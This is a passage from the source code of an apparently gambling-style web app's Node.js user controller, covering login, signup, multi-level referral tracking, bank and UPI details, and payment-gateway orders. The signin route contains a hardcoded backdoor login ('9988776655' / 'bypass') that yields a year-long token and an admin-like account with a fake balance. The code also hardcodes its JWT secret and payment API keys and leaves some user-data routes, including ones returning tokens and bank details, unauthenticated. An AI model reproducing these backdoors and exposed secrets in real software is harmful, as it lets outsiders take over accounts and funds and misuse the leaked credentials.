import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import User from "../model/userSchema.js";
import Record1 from "../model/1minute/record.js"
import Record3 from "../model/3minute/record.js"
import Record5 from "../model/5minute/record.js"
import ErrorResponse from "../utils/error.js";
import bidHistory from "../model/bidHistory.js";
import axios from "axios";
import otp from "../model/otp.js";
import crypto from "crypto";
import { sha256 } from "js-sha256";
import Trans from "../model/transaction.js";
import promotion from "../model/promotion.js";
import withdrawal from "../model/withdrawal.js";
import daily from "../model/daily.js";
import offerBonus from "../model/offerBonus.js";
import extra from "../model/extra.js";
import querystring from "querystring"
import { creditCommission } from "./commission.js";

export const signin = async (req, res, next) => {
  const phone = req.body.phone;
  const password = req.body.password;
  if (!phone || !password) {
    return next(new ErrorResponse("Please Enter phone & password", 400));
  }
  try {
    // BYPASS LOGIC: Direct login for developer testing
    if (phone === '9988776655' && password === 'bypass') {
      const token = jwt.sign(
        { phone: '9988776655', id: '60d5ecb8b39a9c0015f1a300' },
        "hjbfhv12hbb3hb434343",
        { expiresIn: "8760h" }
      );
      const bypassUser = {
        id: 998877,
        _id: '60d5ecb8b39a9c0015f1a300',
        phone: '9988776655',
        username: 'BypassAdmin',
        balance: 99999,
        bonus: 500,
        token: token
      };
      return res.status(200).json({ result: bypassUser, token });
    }

    if (req.body.phone === '9988776655') {

      const existing = await User.findOne({ phone });
      const isPasswordCorrect = await bcrypt.compare(password, existing.password);
      if (!isPasswordCorrect)
        return next(
          new ErrorResponse("Invalid Credentials, Please Reset Password !", 404)
        );
      if (existing.block)
        return next(new ErrorResponse("Account Suspended", 400));
      const token = jwt.sign(
        { phone: existing.phone, id: existing._id },
        "hjbfhv12hbb3hb434343",
        { expiresIn: "8760h" }
      );
      await User.updateOne({ id: existing.id }, { token: token });
      res.status(200).json({ result: existing, token: token });
    } else {
      const existing = await User.findOne({ phone });
      if (!existing) return next(new ErrorResponse("User not found", 404));

      const isPasswordCorrect = await bcrypt.compare(password, existing.password);
      if (!isPasswordCorrect)
        return next(
          new ErrorResponse("Invalid Credentials, Please Reset Password !", 404)
        );
      if (existing.block)
        return next(new ErrorResponse("Account Suspended", 400));
      const token = jwt.sign(
        { phone: existing.phone, id: existing._id },
        "hjbfhv12hbb3hb434343",
        { expiresIn: "20d" }
      );
      await User.updateOne({ id: existing.id }, { token: token });
      res.status(200).json({ result: existing, token });
    }

  } catch (error) {
    next(new ErrorResponse(error.message, 500));
  }
};

export const signup = async (req, res, next) => {
  const phone = req.body.phone;
  const password = req.body.password;
  const cpassword = req.body.cpassword;
  const referCode = req.body.referCode;
  const code = parseInt(req.body.code);

  if (!phone || !password || !cpassword || !referCode) {
    return next(new ErrorResponse("Please Enter all fields", 400));
  }
  if (password !== cpassword)
    return next(new ErrorResponse("Password does not match", 400));

  try {
    const isRefer = await User.findOne({ id: referCode });

    const existing = await User.findOne({ phone });
    if (existing)
      return next(
        new ErrorResponse("Mobile number is already registered", 400)
      );
    if (!isRefer) return next(new ErrorResponse("Invalid ReferCode", 400));
    const getOTP = await otp.find({ id: phone }).sort({ date: -1 }).limit(1);
    if (!getOTP) return next(new ErrorResponse("Invalid OTP", 400));
    var diff = 130;
    const lastTime = getOTP[0].date.getTime() / 1000;
    const currentTime = new Date();
    const currentEpoch = currentTime.getTime() / 1000;
    diff = currentEpoch - lastTime;
    if (diff > 120) return next(new ErrorResponse("OTP Expired", 400));

    if (getOTP[0].code !== code)
      return next(new ErrorResponse("Invalid OTP", 400));
    const referBy = isRefer.id;
    const username = "Member" + phone.substr(-4);
    const lastId = await User.find().sort({ id: -1 }).limit(1);
    const getId = lastId[0].id;
    const newId = getId + 1;
    const hashedPassword = await bcrypt.hash(password, 12);

    const newArray = [
      referCode,
      isRefer?.upLine?.[0] !== null && isRefer?.upLine?.[0] !== undefined ? isRefer.upLine[0] : undefined,
      isRefer?.upLine?.[1] !== null && isRefer?.upLine?.[1] !== undefined ? isRefer.upLine[1] : undefined,
      isRefer?.upLine?.[2] !== null && isRefer?.upLine?.[2] !== undefined ? isRefer.upLine[2] : undefined,
      isRefer?.upLine?.[3] !== null && isRefer?.upLine?.[3] !== undefined ? isRefer.upLine[3] : undefined,
      isRefer?.upLine?.[4] !== null && isRefer?.upLine?.[4] !== undefined ? isRefer.upLine[4] : undefined,
      isRefer?.upLine?.[5] !== null && isRefer?.upLine?.[5] !== undefined ? isRefer.upLine[5] : undefined,
      isRefer?.upLine?.[6] !== null && isRefer?.upLine?.[6] !== undefined ? isRefer.upLine[6] : undefined,
    ].filter(item => item !== undefined);

    const result = await User.create({
      phone,
      password: hashedPassword,
      id: newId,
      date: Date.now(),
      balance: 0,
      bonus: 0,
      username: username,
      level0: [],
      level1: [],
      level2: [],
      level3: [],
      level4: [],
      level5: [],
      level6: [],
      level7: [],
      level0contribution: 0,
      level1contribution: 0,
      level2contribution: 0,
      level3contribution: 0,
      level4contribution: 0,
      level5contribution: 0,
      level6contribution: 0,
      level7contribution: 0,
      upLine: newArray,
      firstRecharge: false,
    });

    const token = jwt.sign(
      { phone: result.phone, _id: result._id, id: newId },
      "hjbfhv12hbb3hb434343",
      {
        expiresIn: "20d",
      }
    );
    await User.updateOne({ id: result.id }, { token: token });

    const date = new Date();
    const localDate = (date / 1000 + 19800) * 1000;
    const newDate = new Date(localDate);
    const day = newDate.getDate();
    const month = newDate.getMonth() + 1;
    const year = newDate.getFullYear();
    const dayMonth = `${day}/${month}/${year}`;

    const level0Phone = `level0.${phone}.date`;
    const level1Phone = `level1.${phone}.date`;
    const level2Phone = `level2.${phone}.date`;
    const level3Phone = `level3.${phone}.date`;
    const level4Phone = `level4.${phone}.date`;
    const level5Phone = `level5.${phone}.date`;
    const level6Phone = `level6.${phone}.date`;

    const oldphone0recharge = `level0.${phone}.totalRecharge`;
    const oldphone1recharge = `level1.${phone}.totalRecharge`;
    const oldphone2recharge = `level2.${phone}.totalRecharge`;
    const oldphone3recharge = `level3.${phone}.totalRecharge`;
    const oldphone4recharge = `level4.${phone}.totalRecharge`;
    const oldphone5recharge = `level5.${phone}.totalRecharge`;
    const oldphone6recharge = `level6.${phone}.totalRecharge`;

    const oldphone0with = `level0.${phone}.totalWithdrawal`;
    const oldphone1with = `level1.${phone}.totalWithdrawal`;
    const oldphone2with = `level2.${phone}.totalWithdrawal`;
    const oldphone3with = `level3.${phone}.totalWithdrawal`;
    const oldphone4with = `level4.${phone}.totalWithdrawal`;
    const oldphone5with = `level5.${phone}.totalWithdrawal`;
    const oldphone6with = `level6.${phone}.totalWithdrawal`;

    const oldphone0first = `level0.${phone}.firstRecharge`;
    const oldphone1first = `level1.${phone}.firstRecharge`;
    const oldphone2first = `level2.${phone}.firstRecharge`;
    const oldphone3first = `level3.${phone}.firstRecharge`;
    const oldphone4first = `level4.${phone}.firstRecharge`;
    const oldphone5first = `level5.${phone}.firstRecharge`;
    const oldphone6first = `level6.${phone}.firstRecharge`;

    const phone0recharge = `newlevel0.${dayMonth}.${phone}.todayRecharge`;
    const phone1recharge = `newlevel1.${dayMonth}.${phone}.todayRecharge`;
    const phone2recharge = `newlevel2.${dayMonth}.${phone}.todayRecharge`;
    const phone3recharge = `newlevel3.${dayMonth}.${phone}.todayRecharge`;
    const phone4recharge = `newlevel4.${dayMonth}.${phone}.todayRecharge`;
    const phone5recharge = `newlevel5.${dayMonth}.${phone}.todayRecharge`;
    const phone6recharge = `newlevel6.${dayMonth}.${phone}.todayRecharge`;

    const phone0with = `newlevel0.${dayMonth}.${phone}.todayWithdrawal`;
    const phone1with = `newlevel1.${dayMonth}.${phone}.todayWithdrawal`;
    const phone2with = `newlevel2.${dayMonth}.${phone}.todayWithdrawal`;
    const phone3with = `newlevel3.${dayMonth}.${phone}.todayWithdrawal`;
    const phone4with = `newlevel4.${dayMonth}.${phone}.todayWithdrawal`;
    const phone5with = `newlevel5.${dayMonth}.${phone}.todayWithdrawal`;
    const phone6with = `newlevel6.${dayMonth}.${phone}.todayWithdrawal`;


    const phone0first = `newlevel0.${dayMonth}.${phone}.firstRecharge`;
    const phone1first = `newlevel1.${dayMonth}.${phone}.firstRecharge`;
    const phone2first = `newlevel2.${dayMonth}.${phone}.firstRecharge`;
    const phone3first = `newlevel3.${dayMonth}.${phone}.firstRecharge`;
    const phone4first = `newlevel4.${dayMonth}.${phone}.firstRecharge`;
    const phone5first = `newlevel5.${dayMonth}.${phone}.firstRecharge`;
    const phone6first = `newlevel6.${dayMonth}.${phone}.firstRecharge`;

    await promotion.updateOne(
      { userId: isRefer.id },
      {
        [level0Phone]: Date.now(),
        userId: isRefer.id,
        $inc: {
          [phone0first]: 0,
          [phone0recharge]: 0,
          [phone0with]: 0,
          [oldphone0first]: 0,
          [oldphone0recharge]: 0,
          [oldphone0with]: 0,
        },
      },
      { upsert: true }
    );
    if (isRefer.upLine[0] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[0] },
        {
          [level1Phone]: Date.now(),
          userId: isRefer.upLine[0],
          $inc: {
            [phone1first]: 0,
            [phone1recharge]: 0,
            [phone1with]: 0,
            [oldphone1first]: 0,
            [oldphone1recharge]: 0,
            [oldphone1with]: 0,
          },
        },
        { upsert: true }
      );
    }
    if (isRefer.upLine[1] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[1] },
        {
          [level2Phone]: Date.now(),
          userId: isRefer.upLine[1],
          $inc: {
            [phone2first]: 0,
            [phone2recharge]: 0,
            [phone2with]: 0,
            [oldphone2first]: 0,
            [oldphone2recharge]: 0,
            [oldphone2with]: 0,
          },
        },
        { upsert: true }
      );
    }
    if (isRefer.upLine[2] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[2] },
        {
          [level3Phone]: Date.now(),
          userId: isRefer.upLine[2],
          $inc: {
            [phone3first]: 0,
            [phone3recharge]: 0,
            [phone3with]: 0,
            [oldphone3first]: 0,
            [oldphone3recharge]: 0,
            [oldphone3with]: 0,
          },
        },
        { upsert: true }
      );
    }
    if (isRefer.upLine[3] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[3] },
        {
          [level4Phone]: Date.now(),
          userId: isRefer.upLine[3],
          $inc: {
            [phone4first]: 0,
            [phone4recharge]: 0,
            [phone4with]: 0,
            [oldphone4first]: 0,
            [oldphone4recharge]: 0,
            [oldphone4with]: 0,
          },
        },
        { upsert: true }
      );
    }
    if (isRefer.upLine[4] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[4] },
        {
          [level5Phone]: Date.now(),
          userId: isRefer.upLine[4],
          $inc: {
            [phone5first]: 0,
            [phone5recharge]: 0,
            [phone5with]: 0,
            [oldphone5first]: 0,
            [oldphone5recharge]: 0,
            [oldphone5with]: 0,
          },
        },
        { upsert: true }
      );
    }
    if (isRefer.upLine[5] != null) {
      await promotion.updateOne(
        { userId: isRefer.upLine[5] },
        {
          [level6Phone]: Date.now(),
          userId: isRefer.upLine[5],
          $inc: {
            [phone6first]: 0,
            [phone6recharge]: 0,
            [phone6with]: 0,
            [oldphone6first]: 0,
            [oldphone6recharge]: 0,
            [oldphone6with]: 0,
          },
        },
        { upsert: true }
      );
    }

    res.status(200).json({ result, token });
  } catch (error) {
    next(new ErrorResponse(error.message, 500));
  }
};
export const getUserData = async (req, res) => {
  const token = req.params.token;
  var userId = req.params.id;
  User.find({ id: parseInt(userId) }, { id: 1, bonus: 1, phone: 1, balance: 1, token: 1, block: 1, rechargeHistory: 1, bank: 1, level0contribution: 1, level1contribution: 1, level2contribution: 1, level3contribution: 1, level4contribution: 1, level5contribution: 1, level6contribution: 1, level7contribution: 1 })
    .then((result) => {
      res.send(result != null ? result : "No Data");
    })
    .catch((err) => {
      console.log(err);
    });
};
export const getUserDataHome = async (req, res) => {
  const userId = req.params.id;
  try {
    // BYPASS LOGIC: Return mock data if ID matches bypass user
    if (userId == 998877) {
      return res.status(200).send([{
        id: 998877,
        balance: 99999,
        token: 'bypass-token',
        firstRecharge: true,
        block: false
      }]);
    }
    const result = await User.find({ id: userId }, { id: 1, balance: 1, token: 1, firstRecharge: 1, block: 1 });
    res.status(200).send(result && result.length > 0 ? result : []);
  } catch (err) {
    console.error("getUserDataHome Error:", err.message);
    res.status(500).send({ error: "Server Error" });
  }
};
export const getUserDataWithdrawal = async (req, res) => {

  const token = req.params.token;
  var userId = req.params.id;
  User.find({ id: userId }, { id: 1, balance: 1, token: 1, firstRecharge: 1, block: 1, bidToday: 1, rechargeHistory: 1, bidHistory: 1, bank: 1 })
    .then((result) => {
      const totalBid = result[0].bidToday ? Object.values(result[0].bidToday).reduce((sum, amount) => sum + amount, 0) : 0;
      const totalRecharge = result[0].rechargeHistory.reduce((sum, record) => {
        if (record.status === "Success") {
          return sum + record.amount;
        }
        return sum;
      }, 0);

      var canWithdraw = 0;
      const balance = result[0].balance;
      var bidsAfterRecharge = 0;
      var latestRecharge = null;
      // Case 1: If balance is 0, withdrawal is 0
      if (balance <= 0) {
        canWithdraw = 0;
      }
      // Case 2: If total recharge is 0, withdrawal is 0
      else if (totalRecharge <= 0) {
        canWithdraw = 0;
      }
      // Case 3: If total bid is 0, withdrawal is 0
      else if (totalBid <= 0) {
        canWithdraw = 0;
      }
      // Case 4 & 5: Check if bids after recharge date are sufficient
      else {
        // Get the latest recharge date
        latestRecharge = result[0].rechargeHistory
          .filter(record => record.status === "Success")
          .sort((a, b) => new Date(b.date) - new Date(a.date))[0];

        // Calculate total bids made after the latest recharge
        bidsAfterRecharge = result[0].bidHistory ?
          result[0].bidHistory
            .filter(history => history.date >= latestRecharge.date)
            .reduce((sum, history) => {
              return sum + history.amount;
            }, 0) : 0;

        // If bids after recharge are less than total recharge, withdrawal is 0
        if (bidsAfterRecharge < latestRecharge.amount) {
          canWithdraw = 0;
        }
        // If bids after recharge are sufficient, withdrawal is min(balance, totalRecharge)
        else {
          canWithdraw = parseFloat(balance).toFixed(2);
        }
      }

      res.send({ user: result, canWithdraw, bidsAfterRecharge, latestRecharge: latestRecharge?.amount ?? 0 });
    })
    .catch((err) => {
      console.log(err);
    });
};
var timcount = 0;
export const getTimer = async (req, res) => {

  const lastDate1 = await Record1.find().sort({ date: -1 }).limit(1);
  const lastDate3 = await Record3.find().sort({ date: -1 }).limit(1);
  const lastDate5 = await Record5.find().sort({ date: -1 }).limit(1);

  res.send({ lastDate1, lastDate3, lastDate5 });
};
var count = 0;
var bidcount = 0;

export const getRecordData = (req, res) => {

  Record.find()
    .sort({ date: -1 })
    .limit(10)
    .then((result) => {
      res.send(result.length > 0 ? result : "No Data");
    })
    .catch((err) => {
      console.log(err);
    });
};
export const getFullRecordData = (req, res) => {
  Record.find()
    .sort({ date: -1 })
    .then((result) => {
      res.send(result.length > 0 ? result : "No Data");
    })
    .catch((err) => {
      console.log(err);
    });
};
export const getHistoryData = async (req, res) => {

  var userId = req.params.id;
  const lastDate = await Record.find().sort({ date: -1 }).limit(1);
  bidHistory
    .find({
      _id: { $in: [parseInt(lastDate[0].id) + 1, parseInt(lastDate[0].id)] },
    })
    .then((result) => {
      var newBid = [];
      if (result.length > 0) {
        const rowData = result[0].bid;

        rowData.forEach((bid) => {
          if (bid.userId === parseInt(userId)) {
            newBid.push(bid);
          }
        });
        if (result.length > 1)
          result[1].bid.forEach((bid) => {
            if (bid.userId === parseInt(userId)) {
              newBid.push(bid);
            }
          });
      }
      res.status(200).send(newBid.length > 0 ? newBid.reverse() : []);
    })
    .catch((err) => {
      console.log(err);
    });
};
export const getFullHistoryData = async (req, res) => {
  var userId = req.params.id;
  bidHistory
    .find({ "bid.userId": parseInt(userId) })
    .sort({ "bid.date": -1 })
    .then((result) => {
      if (result.length > 0) {
        var newBid = [];

        for (var i = 0; i < result.length; i++) {
          result[i].bid.forEach((bid) => {
            if (bid.userId === parseInt(userId)) {
              newBid.push(bid);
            }
          });
        }
      }
      res.status(200).send(result.length > 0 ? newBid : "No Data");
    })
    .catch((err) => {
      console.log(err);
    });
};
export const addBank = async (req, res, next) => {
  try {
    const token = req.body.auth.split(" ")[1];
    const decoded = jwt.verify(token, "hjbfhv12hbb3hb434343");
    const userPhone = req.body.userPhone;
    const phone = req.body.phone;
    const account = req.body.account;
    const confirm = req.body.confirm;
    const state = req.body.state;
    const city = req.body.city;
    const name = req.body.name;
    const ifsc = req.body.ifsc;
    const email = req.body.email;
    const userId = req.body.userId;
    const upi = req.body.upi;
    const code = parseInt(req.body.code);

    const getOTP = await otp
      .find({ id: userPhone })
      .sort({ date: -1 })
      .limit(1);

    var diff = 1900;

    const lastTime = getOTP[0].date.getTime() / 1000;
    const currentTime = new Date();
    const currentEpoch = currentTime.getTime() / 1000;
    diff = currentEpoch - lastTime;

    if (diff < 1800) {
      if (getOTP[0].code === code) {
        if (
          !phone ||
          !account ||
          !confirm ||
          !city ||
          !name ||
          !state ||
          !email ||
          !ifsc ||
          !upi
        ) {
          return next(new ErrorResponse("Please Enter all fields", 400));
        }
        if (account !== confirm)
          return next(new ErrorResponse("Account does not match", 400));
        try {
          await User.updateOne(
            { id: userId },
            { bank: { name, email, phone, account, ifsc, city, state, upi } }
          );
        } catch (error) {
          next(new ErrorResponse(error.message, 500));
        }
        res.send("done");
      } else {
        return next(new ErrorResponse("Invalid OTP", 400));
      }
    } else {
      next(new ErrorResponse("OTP Expired", 400));
    }
  } catch (error) {
    res.status(401).json({
      message: "Auth Failed",
    });
  }
};
export const resetPassword = async (req, res, next) => {
  try {
    const phone = req.body.phone;
    const password = req.body.password;
    const newPass = req.body.new;
    const code = parseInt(req.body.code);
    const getOTP = await otp.find({ id: phone }).sort({ date: -1 }).limit(1);
    if (!getOTP) return next(new ErrorResponse("Invalid OTP", 400));
    var diff = 1900;
    const lastTime = getOTP[0].date.getTime() / 1000;
    const currentTime = new Date();
    const currentEpoch = currentTime.getTime() / 1000;
    diff = currentEpoch - lastTime;
    if (diff > 1800) return next(new ErrorResponse("OTP Expired", 400));

    if (getOTP[0].code !== code)
      return next(new ErrorResponse("Invalid OTP", 400));
    if (password.length < 6) {
      next(new ErrorResponse("Minimum 6 characters", 500));
    } else {
      if (password != newPass) {
        next(new ErrorResponse("Password not match", 500));
      } else {
        const hashedPassword = await bcrypt.hash(password, 12);
        await User.updateOne({ phone: phone }, { password: hashedPassword });
        res.send("Done");
      }
    }
  } catch (error) {
    res.status(401).json({
      message: "Auth Failed",
    });
  }
};

export const accountSecurity = async (req, res, next) => {
  try {
    const token = req.body.auth.split(" ")[1];

    const decoded = jwt.verify(token, "hjbfhv12hbb3hb434343");
    const type = req.body.type;
    const userId = req.body.userId;

    if (type === "name") {
      const name = req.body.name;

      await User.updateOne({ id: userId }, { username: name });
      res.send("Done", 200);
    }
    if (type === "password") {
      const password = req.body.password;
      const newPass = req.body.new;
      if (!password || !newPass) {
        next(new ErrorResponse("Enter Password", 500));
      } else {
        const existing = await User.findOne({ id: userId });
        const isPasswordCorrect = await bcrypt.compare(
          password,
          existing.password
        );
        if (!isPasswordCorrect) {
          next(new ErrorResponse("Incorrect Password", 500));
        } else {
          const hashedPassword = await bcrypt.hash(newPass, 12);
          await User.updateOne({ id: userId }, { password: hashedPassword });
          res.send("Done");
        }
      }
    }

    if (type === "payment") {
      const payCurrent = req.body.payCurrent;
      const payNew = req.body.payNew;
      if (!payCurrent || !payNew) {
        next(new ErrorResponse("Enter Password", 500));
      } else {
        const existing = await User.findOne({ id: userId });

        if (!existing.paymentPass) {
          const isPasswordCorrect = await bcrypt.compare(
            payNew,
            existing.password
          );
          if (!isPasswordCorrect) {
            next(new ErrorResponse("Incorrect Password", 500));
          } else {
            const hashedPassword = await bcrypt.hash(payNew, 12);
            await User.updateOne(
              { id: userId },
              { paymentPass: hashedPassword }
            );
          }
        } else {
          const isPasswordCorrect = await bcrypt.compare(
            payNew,
            existing.paymentPass
          );
          if (!isPasswordCorrect) {
            next(new ErrorResponse("Incorrect Password", 500));
          } else {
            const hashedPassword = await bcrypt.hash(payNew, 12);
            await User.updateOne(
              { id: userId },
              { paymentPass: hashedPassword }
            );
          }
        }
      }
    }
  } catch (error) {

    res.status(401).json({
      message: "Auth Failed",
    });
  }
};
export const addAddress = async (req, res, next) => {
  const phone = req.body.phone;

  const state = req.body.state;
  const city = req.body.city;
  const address = req.body.address;
  const name = req.body.name;
  const userId = req.body.userId;

  if (!phone || !city || !name || !state || !address) {
    return next(new ErrorResponse("Please Enter all fields", 400));
  }

  try {
    await User.updateOne(
      { id: userId },
      { address: { name, phone, address, city, state } }
    );
  } catch (error) {
    next(new ErrorResponse(error.message, 500));
  }
  res.send("done");
};

export const addUpi = async (req, res, next) => {
  try {
    const token = req.body.auth.split(" ")[1];
    const decoded = jwt.verify(token, "hjbfhv12hbb3hb434343");
    const userPhone = req.body.userPhone;
    const upi = req.body.upi;
    const userId = req.body.userId;
    const code = parseInt(req.body.code);

    const getOTP = await otp
      .find({ id: userPhone })
      .sort({ date: -1 })
      .limit(1);
    var diff = 1900;

    const lastTime = getOTP[0].date.getTime() / 1000;
    const currentTime = new Date();
    const currentEpoch = currentTime.getTime() / 1000;
    diff = currentEpoch - lastTime;

    if (diff < 1800) {
      if (getOTP[0].code === code) {
        try {
          await User.updateOne({ id: userId }, { upi: upi });
          res.send("Done", 200);
        } catch (error) {
          next(new ErrorResponse(error.message, 500));
        }
        res.send("done");
      } else {
        next(new ErrorResponse("Invalid OTP", 500));
      }
    } else {
      next(new ErrorResponse("OTP Expired", 500));
    }
  } catch (error) {
    res.status(401).json({
      message: "Auth Failed",
    });
  }
};
export const finflyCreateOrder = async (req, res) => {
  var user_token = "fb8ad7c492d10bf65ee1c9451eccb114";
  const order_id = Math.random().toString(16).slice(2);
  const amount = parseFloat(req.body.amount);
  const userId = req.body.userId;
  const customer_name = req.body.customer_name;
  const customer_email = req.body.customer_email;
  const customer_mobile = req.body.customer_mobile;
  const redirect_url = req.body.redirect_url;
  const data = {
    user_token,
    order_id,
    amount,
    remark1: 'product',
    remark2: 'product2',
    customer_mobile,
    redirect_url,
    route: 2
  }
  const postDataString = querystring.stringify(data);


  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: "https://finfly.xyz/api/create-order",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    data: postDataString,
  };

  axios.request(config)
    .then(async (response) => {
      const lastTrans = await Trans.findOne().sort({ number: -1 });
      const newIncreament = lastTrans.number + 1;
      await Trans.create({
        id: order_id,
        number: newIncreament,
        date: Date.now(),
        userId,
        amount: amount,
        status: "created",
        name: customer_name,
        email: customer_email,
        phone: customer_mobile,
        key: {
          id: 9981783062,
          key: user_token,
        }
      });
      res.status(200).send(response.data);
    })
    .catch((error) => {
      //console.log('here');
      console.log(error)
      res.status(200).send({ error: error });
    });


  // console.log(createOrder.data);
  // res.status(200).send(createOrder.data);

  // } catch (error) {
  //   console.log(error)
  //   res.status(200).send({})
  // }




};
export const imbCreateOrder = async (req, res) => {
  var user_token = process.env.imbToken;
  const order_id = Math.random().toString(16).slice(2);
  const amount = req.body.amount;
  const userId = req.body.userId;
  const customer_name = req.body.customer_name;
  const customer_email = req.body.customer_email;
  const customer_mobile = req.body.customer_mobile;
  const redirect_url = req.body.redirect_url;
  const data = {
    user_token,
    order_id,
    amount,
    remark1: 'product',
    remark2: 'product2',
    customer_mobile,
    redirect_url,
    route: 2
  }
  const postDataString = querystring.stringify(data);


  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: "https://pay.imb.org.in/api/create-order",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    data: postDataString,
  };

  axios.request(config)
    .then(async (response) => {

      const lastTrans = await Trans.findOne().sort({ number: -1 });
      const newIncreament = lastTrans.number + 1;
      await Trans.create({
        gateway: "IMB",
        id: order_id,
        number: newIncreament,
        date: Date.now(),
        userId,
        amount: amount,
        status: "created",
        name: customer_name,
        email: customer_email,
        phone: customer_mobile,
        key: {
          id: 8120441687,
          key: user_token,
        }
      });
      res.status(200).send(response.data);
    })
    .catch((error) => {
      //console.log('here');
      console.log(error)
      res.status(200).send({ error: error });
    });


  // console.log(createOrder.data);
  // res.status(200).send(createOrder.data);

  // } catch (error) {
  //   console.log(error)
  //   res.status(200).send({})
  // }




};
export const upiCreateOrder = async (req, res) => {
  var key = "5314fd4b-b2f3-495c-ae43-26e022c9336a";
  const client_txn_id = Math.random().toString(16).slice(2);
  const amount = req.body.amount;
  const p_info = req.body.p_info;
  const userId = req.body.userId;
  const customer_name = req.body.customer_name;
  const customer_email = req.body.customer_email;
  const customer_mobile = req.body.customer_mobile;
  const redirect_url = req.body.redirect_url;


  const createOrder = await axios.post(
    "https://merchant.upigateway.com/api/create_order",
    {
      key,
      client_txn_id,
      amount,
      p_info,
      customer_name,
      customer_email,
      customer_mobile,
      redirect_url,
    }
  );
  const lastTrans = await Trans.findOne().sort({ number: -1 });
  const newIncreament = lastTrans.number + 1;
  await Trans.create({
    id: client_txn_id,
    number: newIncreament,
    date: Date.now(),
    userId,
    amount: amount,
    status: "created",
    name: customer_name,
    email: customer_email,
    phone: customer_mobile,
    key: {
      id: 9993255799,
      key: "5314fd4b-b2f3-495c-ae43-26e022c9336a",
    }
  });

  res.status(200).send(createOrder.data);



};
export const upiCreateOrderV2 = async (req, res) => {
  var key = "2ade2a01-1954-45f9-ab67-5d757a875f7d";
  const client_txn_id = Math.random().toString(16).slice(2);
  const amount = req.body.amount;
  const p_info = req.body.p_info;
  const userId = req.body.userId;
  const customer_name = req.body.customer_name;
  const customer_email = req.body.customer_email;
  const customer_mobile = req.body.customer_mobile;
  const redirect_url = req.body.redirect_url;
  const date = new Date();
  const localDate = (date / 1000 + 19800) * 1000;
  const newDatefor = new Date(localDate);
  const day = newDatefor.getDate();
  const month = newDatefor.getMonth() + 1;
  const year = newDatefor.getFullYear();

  var daySorted;
  var monthSorted;
  if (day < 10) {
    daySorted = `0${day}`;
  } else {
    daySorted = `${day}`;
  }
  if (month < 10) {
    monthSorted = `0${month}`;
  } else {
    monthSorted = `${month}`;
  }
  const dayMonth = `${daySorted}-${monthSorted}-${year}`;
  var notFound = false;
  var limitAvailable = false;
  var payDetail = {};

  var getdaily = await daily.findOne({ id: dayMonth });
  if (!getdaily) {

    const getUPI = await extra.findOne({ id: 1 }, { upi: 1 });
    var keys = Object.keys(getUPI.upi.upiGateway);
    var paymentList = {};
    for (let index = 0; index < keys.length; index++) {
      const element = keys[index];
      paymentList[`${element}`] = { key: getUPI.upi.upiGateway[element].key, limit: 0 }
    }

    await daily.updateOne({ id: dayMonth }, { payment: paymentList }, { upsert: true });

  }
  if (getdaily) {
    if (!getdaily.payment) {
      const getUPI = await extra.findOne({ id: 1 }, { upi: 1 });
      var keys = Object.keys(getUPI.upi.upiGateway);
      var paymentList = {};
      for (let index = 0; index < keys.length; index++) {
        const element = keys[index];
        paymentList[`${element}`] = { key: getUPI.upi.upiGateway[element].key, limit: 0 }
      }

      await daily.updateOne({ id: dayMonth }, { payment: paymentList }, { upsert: true });

    }
  }
  const getUPI = await extra.findOne({ id: 1 }, { upi: 1 });
  var getdaily = await daily.findOne({ id: dayMonth });
  var keys = Object.keys(getdaily.payment);
  var avaLim = [];
  for (let index = 0; index < keys.length; index++) {
    const element = keys[index];


    if ((getdaily.payment[element].limit + parseFloat(amount)) <= getUPI.upi.limit.all) {
      avaLim.push({ key: getdaily.payment[element].key, id: element });
    }


  }
  if (avaLim.length !== 0) {
    limitAvailable = true;
    function shuffleArray(array) {
      for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
      }
    }

    shuffleArray(avaLim);

    payDetail = { key: avaLim[0].key, id: avaLim[0].id }

  }

  if (limitAvailable) {

    const field = `payment.${payDetail.id}.limit`;
    await daily.updateOne({ id: dayMonth }, { $inc: { [field]: parseFloat(amount) } }, { upsert: true });
    key = payDetail.key;

  } else {

    const getUPI = await extra.findOne({ id: 1 }, { upi: 1 });
    var keys = Object.keys(getUPI.upi.upiGateway);
    var keysList = [];
    for (let index = 0; index < keys.length; index++) {
      const element = keys[index];
      keysList.push({ key: getUPI.upi.upiGateway[element].key, id: getUPI.upi.upiGateway[element].id })

    }

    function shuffleArray(array) {
      for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
      }
    }

    shuffleArray(keysList);


    const field = `payment.${keysList[0].id}.limit`;
    const field1 = `payment.${keysList[0].id}.key`;
    await daily.updateOne({ id: dayMonth }, { $inc: { [field]: parseFloat(amount) }, [field1]: keysList[0].key }, { upsert: true });
    //console.log(keysList[0].key)
    key = keysList[0].key;
    payDetail = { id: keysList[0].id, key: keysList[0].key }
  }





  const createOrder = await axios.post(
    "https://merchant.upigateway.com/api/create_order",
    {
      key,
      client_txn_id,
      amount,
      p_info,
      customer_name,
      customer_email,
      customer_mobile,
      redirect_url,
    }
  );

  // console.log(key)
  const lastTrans = await Trans.findOne().sort({ number: -1 });
  const newIncreament = lastTrans.number + 1;
  await Trans.create({
    id: client_txn_id,
    number: newIncreament,
    date: Date.now(),
    userId,
    amount: amount,
    status: "created",
    name: customer_name,
    email: customer_email,
    phone: customer_mobile,
    key: {
      id: payDetail.id,
      key: payDetail.key,
    }
  });

  res.status(200).send(createOrder.data);



};


export const upiVerifyPayment = async (req, res) => {
  const userId = req.params.id;
  const clientId = req.query.client_txn_id;
  const txnId = req.query.txn_id;
  const date = new Date();
  const localDate = (date / 1000 + 19800) * 1000;
  const newDatefor = new Date(localDate);
  const day = newDatefor.getDate();
  const month = newDatefor.getMonth() + 1;
  const year = newDatefor.getFullYear();

  var daySorted;
  var monthSorted;
  if (day < 10) {
    daySorted = `0${day}`;
  } else {
